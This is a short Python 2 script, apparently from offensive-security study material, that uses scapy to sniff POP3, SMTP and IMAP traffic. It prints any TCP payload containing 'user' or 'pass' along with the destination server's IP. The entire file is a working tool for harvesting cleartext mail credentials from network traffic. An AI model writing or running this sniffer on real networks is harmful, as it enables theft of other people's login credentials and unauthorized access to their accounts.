#import scapy 
from scapy.all import *

#Create packet callback function
def packet_callback(packet):
    #check to make sure there is a TCP payload in packet
    if packet[TCP].payload:
        #save pack as string
        mail_packet = str(packet[TCP].payload)
        #check for user or pass in the payload as we are searching for clear text creds
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            #print the IP and Payload of packets cotaining clear text creds
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

#fire up sniffer
sniff(filter= "tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)